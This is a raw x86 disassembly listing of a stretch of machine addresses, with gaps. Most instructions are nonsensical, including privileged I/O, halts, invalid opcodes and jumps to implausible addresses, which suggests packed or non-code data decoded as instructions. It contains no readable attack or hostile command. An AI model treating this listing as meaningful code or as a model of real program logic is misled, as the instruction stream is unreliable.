  423962:	out    0xb6,eax
  423964:	scas   al,BYTE PTR es:[edi]
  423965:	xor    al,0x5
  423967:	push   esp
  423968:	loop   0x4239b3
  42396a:	cld    
  42396b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42396c:	inc    esp
  42396d:	hlt    
  42396e:	cs mov esi,0x26f2e3f6
  423974:	add    al,0x2c
  423976:	call   0x4f6e811
  42397b:	sbb    al,0xf5
  42397d:	jp     0x423966
  42397f:	ret    0xb4bf
  423982:	add    al,0x60
  423984:	out    dx,al
  423985:	daa    
  423986:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423987:	sub    DWORD PTR [edx+esi*1],eax
  42398a:	call   DWORD PTR [esi-0x17fb4b52]
  423990:	cmp    DWORD PTR [ecx],edi
  423992:	out    dx,eax
  423993:	call   esp
  423995:	sub    ebp,eax
  423997:	jmp    DWORD PTR [ecx-0x4e]
  42399a:	cld    
  42399b:	sub    BYTE PTR [edx],ch
  42399d:	or     edx,edx
  42399f:	inc    edi
  4239a0:	mov    cl,0x0
	...
  4239ba:	add    ebx,ebp
  4239bc:	inc    edi
  4239bd:	frstor [ebx]
  4239bf:	cmp    eax,0xf7cff974
  4239c4:	sub    BYTE PTR [edi+esi*8],0x4
  4239c8:	add    BYTE PTR [esi+0x57],bh
  4239cb:	out    dx,eax
  4239cc:	aas    
  4239cd:	jmp    0xc2b62e3
  4239d2:	inc    ebp
  4239d3:	push   esp
  4239d4:	adc    eax,0x22eef7a9
  4239d9:	adc    cl,dh
  4239db:	shr    edi,0xff
  4239de:	aaa    
  4239df:	add    eax,0x1468c16a
  4239e4:	mov    ebp,0x44bd29
  4239e9:	xchg   ebx,eax
  4239ea:	retf   
  4239eb:	ins    DWORD PTR es:[edi],dx
  4239ec:	add    al,0x36
  4239ee:	inc    edi
  4239ef:	sbb    al,BYTE PTR [eax-0x17]
  4239f2:	or     DWORD PTR [edi],ebx
  4239f4:	lahf   
  4239f5:	or     eax,0x3effc5b4
  4239fa:	scas   eax,DWORD PTR es:[edi]
  4239fb:	inc    ebp
  4239fc:	jb     0x423a18
  4239fe:	lock push esp
  423a00:	ja     0x423a2b
  423a02:	lock adc DWORD PTR [edx],0x44861d
  423a09:	add    dh,BYTE PTR [edi-0x6fbee308]
  423a0f:	cld    
  423a10:	aas    
  423a11:	jmp    0x5154bc3d
  423a16:	inc    sp
  423a18:	add    BYTE PTR [edx+0x4c],cl
  423a1b:	push   eax
  423a1c:	inc    eax
  423a1d:	jmp    0x423a22
	...
  423a36:	add    BYTE PTR [esi],bh
  423a38:	inc    ebp
  423a39:	jb     0x423a19
  423a3b:	jbe    0x423a89
  423a3d:	cld    
  423a3e:	add    BYTE PTR [esi+0x4d43c86c],ch
  423a44:	lahf   
  423a45:	add    DWORD PTR [ecx+0x3fc441],esp
  423a4b:	sahf   
  423a4c:	nop
  423a4d:	sti    
  423a4e:	je     0x423a9c
  423a50:	dec    edi
  423a51:	mov    edi,0x4985f874
  423a56:	or     BYTE PTR [edi+esi*1+0x68],cl
  423a5a:	add    BYTE PTR ds:0xba570008,cl
  423a60:	mov    eax,0xc740c081
  423a65:	xchg   BYTE PTR [ebp-0x2b],dl
  423a68:	dec    BYTE PTR [ecx+0xc]
  423a6b:	mov    ch,0xb
  423a6d:	std    
  423a6e:	dec    ebp
  423a70:	lahf   
  423a71:	loop   0x4239f9
  423a73:	int    0x7
  423a75:	sti    
  423a76:	jne    0x423a4d
  423a78:	(bad)  
  423a79:	in     al,dx
  423a7a:	inc    eax
  423a7c:	repz adc al,BYTE PTR [eax-0x33]
  423a80:	dec    esi
  423a81:	out    dx,eax
  423a82:	jne    0x423a35
  423a84:	xchg   edx,eax
  423a85:	jno    0x423a93
  423a87:	stos   BYTE PTR es:[edi],al
  423a88:	jl     0x423a2e
  423a8a:	adc    ebx,DWORD PTR [ebp+0x7]
  423a8d:	mov    al,0x1
  423a8f:	(bad)  
  423a90:	jo     0x423a8d
  423a92:	jne    0x423a1d
  423a94:	mov    dl,cl
  423a96:	add    ch,ch
  423a98:	or     BYTE PTR [eax],al
  423a9a:	push   ebx
	...
  423ab3:	add    dh,cl
  423ab5:	cmp    cl,BYTE PTR [edi-0x1]
  423ab8:	mov    al,ds:0x8d400f2f
  423abd:	mov    WORD PTR [ebx+ebp*8+0x5fbc5587],?
  423ac4:	sti    
  423ac5:	das    
  423ac6:	pop    ecx
  423ac7:	ret    0x765
  423aca:	push   ecx
  423acb:	mov    ebp,DWORD PTR [ecx+0x38]
  423ace:	jg     0x423b4d
  423ad0:	hlt    
  423ad1:	jge    0x423ad3
  423ad3:	je     0x423ace
  423ad5:	out    0x47,al
  423ad7:	adc    dl,bl
  423ad9:	out    dx,al
  423ada:	enter  0xc15b,0x69
  423ade:	add    DWORD PTR [edx+0x4],0x7f563170
  423ae5:	js     0x423adf
  423ae7:	push   esp
  423ae8:	jns    0x423acd
  423aea:	std    
  423aeb:	add    DWORD PTR [ecx+0x6d],0x0
  423aef:	add    BYTE PTR [edi-0x58],bh
  423af2:	cld    
  423af3:	out    0xc1,eax
  423af5:	jmp    0x423af7
  423af7:	add    BYTE PTR [edi+0x25],ch
  423afa:	dec    esi
  423afb:	add    esi,ebp
  423afd:	ins    DWORD PTR es:[edi],dx
  423afe:	add    BYTE PTR [ecx],bh
  423b00:	shr    DWORD PTR [ebx-0x7f],cl
  423b03:	mov    ebp,0x89006bf4
  423b08:	xor    DWORD PTR [eax+ebx*4+0x1d],edi
  423b0c:	jb     0x423b7a
  423b0e:	add    BYTE PTR [edi-0x3b35e7c7],al
  423b14:	sti    
  423b15:	out    dx,al
  423b16:	pop    ecx
  423b17:	inc    DWORD PTR [eax]
	...
  423b31:	ret    
  423b32:	ins    BYTE PTR es:[edi],dx
  423b33:	xchg   eax,ebx
  423b35:	inc    ecx
  423b36:	je     0x423abf
  423b38:	mov    edi,0xff6df003
  423b3d:	stos   DWORD PTR es:[edi],eax
  423b3e:	ins    BYTE PTR es:[edi],dx
  423b3f:	xchg   DWORD PTR [edi+0x72c71629],edi
  423b45:	call   0x38cd2d21
  423b4a:	ja     0x423b4a
  423b4c:	dec    edi
  423b4d:	mov    ebx,ecx
  423b4f:	call   DWORD PTR [ebp-0x7d]
  423b52:	popa   
  423b53:	cmp    al,0x16
  423b55:	xor    al,0x6c
  423b57:	jg     0x423b1c
  423b59:	add    BYTE PTR [edx],ah
  423b5b:	mov    edx,DWORD PTR [edx]
  423b5d:	pushf  
  423b5e:	pop    edi
  423b5f:	inc    eax
  423b60:	add    BYTE PTR [edi+0x5],ch
  423b63:	mov    ch,0x9c
  423b65:	cmp    DWORD PTR [eax+0x97f03e6],ecx
  423b6b:	sub    eax,0xb187c499
  423b70:	sbb    BYTE PTR [edi+0x6f00338d],ch
  423b76:	cmp    edx,esp
  423b78:	and    eax,0x8de50175
  423b7d:	iret   
  423b7e:	adc    DWORD PTR [edi+eax*2-0xf],edx
  423b82:	xor    eax,0x11b6cc27
  423b87:	out    dx,al
  423b88:	jbe    0x423bdd
  423b8a:	push   es
  423b8b:	lods   al,BYTE PTR ds:[esi]
  423b8c:	(bad)  
  423b8d:	hlt    
  423b8e:	inc    ebp
  423b8f:	adc    ebp,eax
  423b91:	test   al,dl
  423b93:	(bad)  
  423b94:	add    BYTE PTR ds:[eax],al
	...
  423bab:	add    BYTE PTR [eax],al
  423bad:	add    ah,ch
  423baf:	clc    
  423bb0:	in     al,dx
  423bb1:	xor    eax,0xfbbb8243
  423bb6:	call   0x2437d6d2
  423bbb:	add    eax,0x3efc86a
  423bc0:	xchg   esp,eax
  423bc1:	sti    
  423bc2:	push   ebx
  423bc3:	add    dh,ah
  423bc5:	add    eax,DWORD PTR [eax+0x10]
  423bc8:	bound  edi,QWORD PTR [edi]
  423bca:	in     al,dx
  423bcb:	test   DWORD PTR [ebx-0x65110a05],ebp
  423bd1:	sub    ebx,DWORD PTR [edx]
  423bd3:	mov    edi,fs
  423bd5:	js     0x423bfd
  423bd7:	or     eax,0x8fa04762
  423bdc:	sub    al,BYTE PTR [esi+esi*8]
  423bdf:	aam    0xdd
  423be1:	push   ss
  423be2:	in     al,0xda
  423be4:	aad    0xf6
  423be6:	aas    
  423be7:	sbb    esp,DWORD PTR [edi]
  423be9:	add    al,0x75
  423beb:	dec    eax
  423bec:	repnz xor eax,0xf08f1779
  423bf2:	xor    eax,DWORD PTR ds:0x6c316200
  423bf8:	add    edx,edi
  423bfa:	aaa    
  423bfb:	loopne 0x423c5a
  423bfd:	inc    edx
  423bfe:	lahf   
  423bff:	inc    ebx
  423c00:	or     ebp,ecx
  423c02:	and    al,0xc1
  423c04:	shl    ecx,0xf7
  423c07:	out    dx,al
  423c08:	add    DWORD PTR [ecx],esi
  423c0a:	ss or  eax,0xf5616c00
  423c10:	sbb    eax,0x72
	...
  423c29:	add    BYTE PTR [eax],al
  423c2b:	xor    ch,cl
  423c2d:	retf   
  423c2e:	sub    dh,al
  423c30:	xor    eax,eax
  423c32:	fs pop esi
  423c34:	cmc    
  423c35:	adc    DWORD PTR [edx+0x22],esi
  423c38:	in     eax,0xcb
  423c3a:	stos   BYTE PTR es:[edi],al
  423c3b:	idiv   DWORD PTR [ecx]
  423c3d:	xor    bl,ch
  423c3f:	or     al,0x41
  423c41:	sub    DWORD PTR [ebx],0xbbbf3c1f
  423c47:	arpl   WORD PTR [edi+eax*8+0x52d5b43e],ax
  423c4e:	bound  ecx,QWORD PTR [ebx]
  423c50:	sub    DWORD PTR [edx+ebp*2],ecx
  423c53:	lahf   
  423c54:	xor    DWORD PTR [eax],0xf78e2042
  423c5a:	loop   0x423cc8
  423c5c:	adc    DWORD PTR [ebp+ebp*2+0x620004f7],eax
  423c63:	ret    0xcbe8
  423c66:	stos   BYTE PTR es:[edi],al
  423c67:	div    DWORD PTR ds:0x4dbc97c0
  423c6d:	jne    0x423c37
  423c6f:	sub    al,0x13
  423c71:	fs sbb eax,0xdb890534
  423c77:	test   eax,0x37f37422
  423c7c:	xchg   ch,al
  423c7e:	add    DWORD PTR [ebx+0x63d571bf],edi
  423c84:	or     eax,0x203d0089
  423c89:	imul   BYTE PTR [eax]
  423c8b:	pop    esi
  423c8c:	call   0x0:0xf887
	...
  423ca7:	add    BYTE PTR [eax],ch
  423ca9:	pusha  
  423caa:	cmp    eax,0xba61946b
  423caf:	mov    eax,fs:0x68e7ffc8
  423cb5:	sar    ah,1
  423cb7:	(bad)  
  423cb8:	(bad)  [eax+0x70]
  423cbb:	inc    ecx
  423cbc:	(bad)  
  423cbd:	dec    ebp
  423cbe:	fs int3 
  423cc0:	push   cs
  423cc1:	or     ebx,edi
  423cc3:	add    eax,0x3fbd05
  423cc8:	xchg   esi,eax
  423cc9:	xchg   ebx,eax
  423cca:	div    BYTE PTR [di]
  423ccd:	pop    es
  423cce:	xor    DWORD PTR [ecx+eiz*8-0x39],esp
  423cd2:	push   DWORD PTR [ebx-0x1b]
  423cd5:	aaa    
  423cd6:	dec    edi
  423cd7:	push   ebx
  423cd8:	dec    esi
  423cd9:	add    DWORD PTR [ebx],ebp
  423cdb:	mov    BYTE PTR [ebx-0x80],dl
  423cde:	sti    
  423cdf:	adc    eax,0x3c78f9
  423ce4:	pop    esi
  423ce5:	cmp    ebx,DWORD PTR [edi+edi*8]
  423ce8:	push   esp
  423ce9:	ret    
  423cea:	pop    es
  423ceb:	mov    DWORD PTR [ebx+0x77],esi
  423cee:	test   DWORD PTR [esi-0x23],ebx
  423cf1:	add    BYTE PTR [ebx+0x14],bl
  423cf4:	inc    esp
  423cf5:	sub    ebx,DWORD PTR [eax]
  423cf7:	mov    DWORD PTR [ebx-0x46a17a9d],eax
  423cfd:	inc    bl
  423cff:	pop    esi
  423d00:	xchg   edx,eax
  423d01:	sub    al,0x57
  423d03:	ret    0x399
  423d06:	push   esi
  423d07:	mov    ebp,DWORD PTR [ebp+0x28f61e]
	...
  423d25:	mov    ss,WORD PTR [eax+eiz*2-0x34]
  423d29:	into   
  423d2a:	or     BYTE PTR [ebx-0x1],dl
  423d2d:	sub    eax,DWORD PTR [ecx+0x6df4267f]
  423d33:	mov    DWORD PTR [edx],edx
  423d35:	clc    
  423d36:	jp     0x423d78
  423d38:	add    BYTE PTR [ebx+0x3f],bh
  423d3b:	clc    
  423d3c:	out    0xbc,eax
  423d3e:	add    DWORD PTR [ecx],eax
  423d40:	add    BYTE PTR [ebx+0x3f],ch
  423d43:	hlt    
  423d44:	mov    BYTE PTR [edx+0x7fc69859],bh
  423d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d4b:	mov    esp,edi
  423d4d:	retf   0x9c05
  423d50:	xor    cl,BYTE PTR [eax-0x3576ff93]
  423d56:	dec    ecx
  423d57:	jg     0x423d4e
  423d59:	shr    BYTE PTR [edi+0x2e],0xe8
  423d5d:	(bad)  
  423d5e:	pop    edx
  423d5f:	add    eax,DWORD PTR [eax]
  423d61:	push   ebp
  423d62:	add    eax,0xe2f440b8
  423d67:	mov    BYTE PTR [edx-0x76c09ecc],al
  423d6d:	jmp    0xf482f1bb
  423d72:	loop   0x423d2c
  423d74:	push   0x4b77052d
  423d79:	in     eax,0x25
  423d7b:	xchg   BYTE PTR [esi],dh
  423d7d:	hlt    
  423d7e:	mov    eax,0x4dd80fe
  423d83:	cmp    DWORD PTR [ebx-0x17],esi
  423d86:	jae    0x423d10
  423d88:	jae    0x423d8a
	...
  423da2:	adc    esi,ecx
  423da4:	mov    DWORD PTR [edx+0x2],esi
  423da7:	mov    edx,0x6c8ff298
  423dac:	add    BYTE PTR [edi],bl
  423dae:	add    DWORD PTR [eax+0x12f440b4],ecx
  423db4:	cli    
  423db5:	mov    bl,al
  423db7:	xchg   ebx,eax
  423db8:	mov    ebx,0xb4906a27
  423dbd:	inc    eax
  423dbe:	hlt    
  423dbf:	add    esp,ebp
  423dc1:	mov    eax,0x7ae704f4
  423dc6:	into   
  423dc7:	in     al,dx
  423dc8:	stos   BYTE PTR es:[edi],al
  423dc9:	inc    ebp
  423dca:	hlt    
  423dcb:	fnsave [eax*8+0x33ba8a26]
  423dd2:	sub    edx,edi
  423dd4:	jle    0x423dd2
  423dd6:	out    0xc1,eax
  423dd8:	out    0x88,al
  423dda:	cmp    ecx,DWORD PTR [ebx+ebp*1+0x3755b8c]
  423de1:	add    esi,esp
  423de3:	mov    DWORD PTR [ebx],ebx
  423de5:	cld    
  423de6:	ja     0x423e2d
  423de8:	in     eax,dx
  423de9:	jg     0x423e5b
  423deb:	add    eax,0xc86d03e7
  423df0:	test   BYTE PTR [ebx+eax*2+0x74d0fb32],0x7d
  423df8:	and    al,0x10
  423dfa:	out    0x81,al
  423dfc:	outs   dx,BYTE PTR ds:[esi]
  423dfd:	and    BYTE PTR [eax-0x767395d1],ch
  423e03:	not    esi
  423e05:	jl     0x423e07
	...
  423e1f:	mov    esi,0x81f6a18
  423e24:	add    eax,0x4ec1f6a
  423e29:	pop    esp
  423e2a:	aas    
  423e2b:	in     al,dx
  423e2c:	aam    0x73
  423e2e:	aas    
  423e2f:	lock aam 0x3d
  423e32:	(bad)  
  423e34:	xlat   BYTE PTR ds:[ebx]
  423e35:	ds popf 
  423e37:	in     al,dx
  423e38:	add    al,0xe7
  423e3a:	jle    0x423dd7
  423e3c:	div    DWORD PTR [esi-0x93e23cf]
  423e42:	add    esi,esp
  423e44:	imul   ebx,DWORD PTR [esi-0x6541d6cc],0x9e0534b7
  423e4e:	mov    BYTE PTR [esi],al
  423e50:	sbb    eax,0x6cf443d9
  423e55:	(bad)  
  423e56:	mov    esp,0xbbfc806d
  423e5b:	dec    eax
  423e5c:	test   bh,dh
  423e5e:	out    0x3,al
  423e60:	sbb    al,0x89
  423e62:	in     al,dx
  423e63:	jmp    0x423eb5
  423e65:	inc    eax
  423e66:	jmp    0x1169834b
  423e6b:	int3   
  423e6c:	or     al,0x4
  423e6e:	cmp    eax,0xf173806c
  423e73:	outs   dx,DWORD PTR ds:[esi]
  423e74:	adc    BYTE PTR [edx],0x79
  423e77:	imul   edi,DWORD PTR ds:0xd830af00,0x135bfcfc
  423e81:	inc    eax
  423e82:	jmp    0x423e87
	...
  423e9b:	add    BYTE PTR [ecx+ecx*4],bl
  423e9e:	fdiv   DWORD PTR [edx]
  423ea0:	in     al,0x6
  423ea2:	or     DWORD PTR [eax+eax*2],0x7cd973e1
  423ea9:	repnz pop ss
  423eab:	jle    0x423ea7
  423ead:	sbb    ch,bh
  423eaf:	cld    
  423eb0:	daa    
  423eb1:	xor    BYTE PTR [edx-0x23],0xe5
  423eb5:	jg     0x423f09
  423eb7:	popa   
  423eb8:	fld    QWORD PTR [ebp-0x3f]
  423ebb:	cmc    
  423ebc:	test   ebp,0x5680bc50
  423ec2:	xor    BYTE PTR [eax+ebp*1],bh
  423ec5:	pop    edx
  423ec6:	jb     0x423eb6
  423ec8:	leave  
  423ec9:	mov    esp,0x4f6ede6
  423ece:	add    cl,al
  423ed0:	mov    edi,0x6ce94050
  423ed5:	pop    ss
  423ed6:	sbb    bl,bh
  423ed8:	aaa    
  423ed9:	add    eax,0xdaba5c6
  423ede:	add    al,dl
  423ee0:	stos   BYTE PTR es:[edi],al
  423ee1:	cmp    al,0xcc
  423ee3:	stos   BYTE PTR es:[edi],al
  423ee4:	div    edi
  423ee6:	sbb    DWORD PTR [eax],eax
  423ee8:	nop
  423ee9:	sub    ebp,DWORD PTR [eax+0x1]
  423eec:	popf   
  423eed:	jl     0x423eeb
  423eef:	inc    al
  423ef1:	push   esp
  423ef2:	or     eax,0x3ce18d40
  423ef7:	int3   
  423ef8:	fiadd  WORD PTR [eax]
  423efa:	aaa    
  423efb:	lds    ebx,FWORD PTR [edx+0xc7fc]
	...
  423f19:	lea    ecx,[eax]
  423f1b:	xchg   DWORD PTR ds:0x3fbcd5,ecx
  423f21:	outs   dx,BYTE PTR ds:[esi]
  423f22:	dec    eax
  423f23:	aaa    
  423f24:	int    0x23
  423f26:	jne    0x423eaf
  423f28:	adc    eax,0x3fbd11
  423f2d:	fs fs jle 0x423f40
  423f31:	loope  0x423f32
  423f33:	cld    
  423f34:	call   FWORD PTR [ebp-0x38]
  423f37:	ss rcr edi,0x9c
  423f3b:	push   edx
  423f3c:	lea    ebx,[ecx]
  423f3e:	std    
  423f3f:	add    BYTE PTR [eax],al
  423f41:	sbb    eax,0x5944be08
  423f46:	enter  0xe7ff,0x6c
  423f4a:	retf   0xfffc
  423f4d:	xchg   ecx,eax
  423f4e:	inc    eax
  423f4f:	or     eax,DWORD PTR [ebp+ecx*4+0x7c000000]
  423f56:	cmp    esp,ecx
  423f58:	inc    ebx
  423f59:	or     eax,0xd94409ff
  423f5e:	(bad)  
  423f5f:	dec    DWORD PTR [edx+0x400d5bf0]
  423f65:	(bad)  [edx]
  423f67:	push   0x23
  423f69:	push   esp
  423f6a:	ins    DWORD PTR es:[edi],dx
  423f6b:	jge    0x423f6c
  423f6d:	sar    BYTE PTR [edi],1
  423f6f:	int3   
  423f70:	inc    ebx
  423f71:	fnsave [ebx+edi*8]
  423f74:	xor    eax,0x3fb39d
  423f79:	hlt    
  423f7a:	adc    ch,BYTE PTR [esi+0x88]
	...
  423f94:	add    BYTE PTR [eax],al
  423f96:	mov    esp,0x51738756
  423f9b:	cwde   
  423f9c:	stc    
  423f9d:	push   edx
  423f9e:	stos   DWORD PTR es:[edi],eax
  423f9f:	mov    al,0x40
  423fa1:	int3   
  423fa2:	aaa    
  423fa3:	outs   dx,BYTE PTR ds:[esi]
  423fa4:	test   ebp,edx
  423fa6:	outs   dx,DWORD PTR ds:[esi]
  423fa7:	jge    0x423f72
  423fa9:	bnd jg 0x423fbc
  423fac:	fmul   QWORD PTR [esi]
  423fae:	xor    al,0x6e
  423fb0:	or     al,0x39
  423fb2:	push   cs
  423fb3:	outs   dx,BYTE PTR ds:[esi]
  423fb4:	sub    eax,0x4663b256
  423fb9:	xchg   dl,dh
  423fbb:	ins    BYTE PTR es:[edi],dx
  423fbc:	mov    edx,0xbcd5f145
  423fc1:	inc    ebp
  423fc2:	cli    
  423fc3:	movsx  edi,WORD PTR [esi]
  423fc6:	hlt    
  423fc7:	mov    ds:0x95370a3a,eax
  423fcc:	out    dx,eax
  423fcd:	clc    
  423fce:	hlt    
  423fcf:	ins    DWORD PTR es:[edi],dx
  423fd0:	jg     0x423f91
  423fd2:	enter  0xba63,0x43
  423fd6:	adc    BYTE PTR [edi+0x3],bh
  423fd9:	jmp    0x247eebb5
  423fde:	jmp    FWORD PTR [ecx+ebx*4+0x1d]
  423fe2:	retf   0x407
  423fe5:	std    
  423fe6:	loope  0x424015
  423fe8:	mov    eax,0xafe2f440
  423fed:	push   esp
  423fee:	sahf   
  423fef:	ins    DWORD PTR es:[edi],dx
  423ff0:	test   DWORD PTR [edx],esi
  423ff2:	mov    ah,0x21
  423ff4:	inc    edx
  423ff5:	add    bl,bh
  423ff7:	das    
  423ff8:	xchg   BYTE PTR [edx],cl
	...
  424012:	add    BYTE PTR [eax+esi*1],bh
  424015:	inc    edx
  424016:	add    BYTE PTR [ebx-0x66],cl
  424019:	sbb    BYTE PTR [eax],ch
  42401b:	mov    al,0xaf
  42401d:	add    ch,bh
  42401f:	add    DWORD PTR [eax-0x12],ecx
  424022:	aas    
  424023:	hlt    
  424024:	add    al,0x71
  424026:	aas    
  424027:	adc    BYTE PTR [esi],cl
  424029:	mov    esp,0xbb462b2a
  42402e:	jp     0x423fff
  424030:	xchg   dl,bh
  424032:	test   BYTE PTR [ebx+edx*8+0x71],0xd0
  424037:	and    edx,DWORD PTR [eax]
  424039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42403a:	add    ecx,DWORD PTR [ecx-0x11]
  42403d:	jmp    0x9040:0x5bdac37a
  424044:	aad    0x73
  424046:	aas    
  424047:	adc    ch,0x50
  42404a:	add    esp,DWORD PTR ds:0x7888538c
  424050:	push   ebx
  424051:	arpl   sp,ax
  424053:	out    0x14,eax
  424055:	jb     0x42408e
  424057:	pusha  
  424058:	sub    BYTE PTR [edi-0x7f9304f0],0x86
  42405f:	pop    eax
  424060:	jp     0x4240c4
  424062:	(bad)  
  424063:	(bad)  
  424064:	sbb    DWORD PTR [edi+edi*1+0x48],esi
  424068:	aad    0x6b
  42406a:	aas    
  42406b:	cmp    al,0xd5
  42406d:	add    bh,ch
  42406f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424070:	mov    ecx,DWORD PTR [ebx]
  424072:	mov    BYTE PTR [eax],dh
  424074:	push   ebx
  424075:	imul   eax,esp,0x0
	...
  424090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424091:	or     DWORD PTR [edx+0x7],ebp
  424094:	sbb    al,0x5
  424096:	sti    
  424097:	cli    
  424098:	ins    BYTE PTR es:[edi],dx
  424099:	fsubr  DWORD PTR [esi-0x67]
  42409c:	dec    esi
  42409d:	aaa    
  42409e:	daa    
  42409f:	cdq    
  4240a0:	cmc    
  4240a1:	mov    ah,0xe7
  4240a3:	and    al,0xa2
  4240a5:	fstp   QWORD PTR [edi]
  4240a7:	shl    DWORD PTR [esi+0x7bdfba87],0x83
  4240ae:	push   edx
  4240af:	adc    bl,ch
  4240b1:	jns    0x424099
  4240b3:	xor    BYTE PTR [edx-0x72],cl
  4240b6:	(bad)  
  4240b7:	sti    
  4240b8:	xlat   BYTE PTR ds:[ebx]
  4240b9:	adc    eax,DWORD PTR [eax-0x17]
  4240bc:	and    BYTE PTR [edi*8+0x40490391],dh
  4240c3:	jmp    0xd4c89304
  4240c8:	fisttp DWORD PTR [eax+0x40]
  4240cb:	jmp    0x35aa7ffe
  4240d0:	xor    eax,0xfe17fd05
  4240d5:	and    BYTE PTR [ebp+0x36],dl
  4240d8:	mov    eax,0xe0e9404d
  4240dd:	ja     0x4240f1
  4240df:	cmp    DWORD PTR [edx+0x436a0039],ebx
  4240e5:	or     eax,0xf949d655
  4240ea:	cmp    bh,BYTE PTR [ecx-0x6b]
  4240ed:	(bad)  
  4240ee:	jmp    edi
  4240f0:	pusha  
  4240f1:	jg     0x42409b
  4240f3:	call   0x4240f8
	...
  42410c:	add    bh,dh
  42410e:	add    al,0x83
  424110:	xchg   edx,eax
  424111:	jmp    0x424142
  424113:	pushw  0x3c
  424116:	jns    0x424188
  424118:	fsubr  st,st(5)
  42411a:	(bad)  
  42411b:	mov    dl,BYTE PTR [eax+ecx*1]
  42411e:	fucom  st(7)
  424120:	push   0x3fc7930
  424125:	mov    bh,0x8d
  424127:	jb     0x4240ca
  424129:	fild   QWORD PTR [ebp+esi*2-0x42]
  42412d:	test   DWORD PTR [ecx+edx*2],0x11590a76
  424134:	sub    eax,edi
  424136:	lea    eax,[ebx-0x17]
  424139:	cmc    
  42413a:	aam    0x50
  42413c:	shl    esi,cl
  42413e:	lea    eax,[edx-0x47]
  424141:	(bad)  
  424142:	mov    eax,ebp
  424144:	mov    ecx,0xe85e8f
  424149:	xor    al,BYTE PTR [ecx+0x7504366]
  42414f:	les    ebx,FWORD PTR [eax+0x35]
  424152:	xor    al,0x3b
  424154:	add    ch,bl
  424156:	push   ds
  424157:	inc    esp
  424158:	lea    ebp,[eax+0x28]
  42415b:	pop    eax
  42415c:	call   0x3e82f9
  424161:	ja     0x42419a
  424163:	mov    DWORD PTR [ebp-0x33],esi
  424166:	sub    al,0xe8
  424168:	cmp    dh,BYTE PTR [edx+0x588d0004]
  42416e:	sub    BYTE PTR [ebp+0x45],al
	...
  424188:	add    BYTE PTR [eax],al
  42418a:	jne    0x424189
  42418c:	ret    0x5889
  42418f:	adc    BYTE PTR [ecx+0x41cc2575],cl
  424195:	je     0x424126
  424197:	add    al,0x0
  424199:	add    BYTE PTR [esi],dl
  42419b:	and    ecx,DWORD PTR [edi-0x73]
  42419e:	sbb    ch,cl
  4241a0:	dec    esp
  4241a1:	mov    edi,0x8000045c
  4241a6:	out    0xcb,al
  4241a8:	in     al,0xb
  4241aa:	ss test bl,bh
  4241ad:	test   DWORD PTR [ebp-0x77ced83],ebx
  4241b3:	jo     0x4241b1
  4241b5:	imul   ebx,DWORD PTR [ecx-0x6b],0x66fd7041
  4241bc:	add    BYTE PTR [ebx-0x30],dl
  4241bf:	dec    ebp
  4241c0:	rcl    BYTE PTR [eax-0x7b],0x7c
  4241c4:	out    0xff,eax
  4241c6:	mov    ds:0xa204c27f,al
  4241cb:	push   ebp
  4241cc:	jo     0x424243
  4241ce:	push   esi
  4241cf:	addr16 inc edx
  4241d1:	lea    ebp,[eax]
  4241d3:	rcl    BYTE PTR [eax+ebp*8-0x48],1
  4241d7:	ret    0xffff
  4241da:	hlt    
  4241db:	inc    ebx
  4241dc:	leave  
  4241dd:	mov    ch,BYTE PTR [ecx-0x66]
  4241e0:	fsub   st,st(7)
  4241e2:	into   
  4241e3:	inc    DWORD PTR [ebx]
  4241e5:	add    BYTE PTR [ecx-0x60],dh
  4241e8:	hlt    
  4241e9:	dec    edi
  4241ea:	dec    esi
  4241eb:	ins    DWORD PTR es:[edi],dx
  4241ec:	xor    eax,0xd9
	...
  424205:	add    BYTE PTR [eax],al
  424207:	daa    
  424208:	fld    st(6)
  42420a:	shl    DWORD PTR [edi+esi*4],cl
  42420d:	mov    edi,DWORD PTR [edx+0x48]
  424210:	pop    ss
  424211:	pop    ss
  424212:	cmp    al,0xe4
  424214:	lods   eax,DWORD PTR ds:[esi]
  424215:	add    BYTE PTR [ebx-0x76f06f4c],al
  42421b:	mov    dl,0x9d
  42421d:	(bad)  
  42421e:	jb     0x424248
  424220:	push   ss
  424221:	adc    ch,ah
  424223:	fwait
  424224:	outs   dx,BYTE PTR ds:[esi]
  424225:	ins    DWORD PTR es:[edi],dx
  424226:	add    esi,eax
  424228:	sub    eax,0x7b00bf88
  42422d:	pop    DWORD PTR [edx+0x30]
  424230:	pop    DWORD PTR ds:[edx-0x60]
  424234:	cmp    eax,0xef5cc48d
  424239:	push   0xfffffffc
  42423b:	imul   ebp,eax,0x40
  42423e:	jae    0x42423c
  424240:	rol    DWORD PTR [edi],cl
  424242:	mov    esi,DWORD PTR [ecx-0x7962bc3]
  424248:	fadd   st,st(7)
  42424a:	dec    ebx
  42424b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42424c:	lock (bad) 
  42424e:	shl    DWORD PTR [esp+esi*8+0x6d4c6fdf],cl
  424255:	ins    DWORD PTR es:[edi],dx
  424256:	cld    
  424257:	xor    eax,DWORD PTR [ebx]
  424259:	int3   
  42425a:	mov    ah,BYTE PTR [ecx-0x55182737]
  424260:	mov    bh,0x0
  424262:	add    BYTE PTR [esi-0x338d70dc],cl
  424268:	adc    eax,0x686c
	...
  424281:	add    BYTE PTR [eax],al
  424283:	add    dl,cl
  424285:	add    al,0xe7
  424287:	add    ecx,DWORD PTR [esi-0x60079436]
  42428d:	fdivr  QWORD PTR [esi]
  42428f:	jecxz  0x4242c2
  424291:	add    eax,0x3d3690e7
  424296:	jo     0x424260
  424298:	aaa    
  424299:	mov    ah,BYTE PTR [esp+ecx*4]
  42429c:	ss int 0x5f
  42429f:	loopne 0x4242e8
  4242a1:	mov    ds:0xe704f6f3,eax
  4242a7:	add    eax,ecx
  4242a9:	lock xchg edx,eax
  4242ab:	nop
  4242ac:	mov    eax,ss:0xda40edb6
  4242b2:	pop    ebx
  4242b3:	shl    bh,0x75
  4242b6:	add    eax,0x461e9b82
  4242bb:	add    esi,esp
  4242bd:	fisttp DWORD PTR [edi-0x5408ac78]
  4242c3:	in     eax,dx
  4242c4:	cmc    
  4242c5:	xchg   DWORD PTR [ebx-0x38],esp
  4242c8:	and    DWORD PTR [edx-0x7f912b03],ecx
  4242ce:	jmp    0x6abc:0x36767080
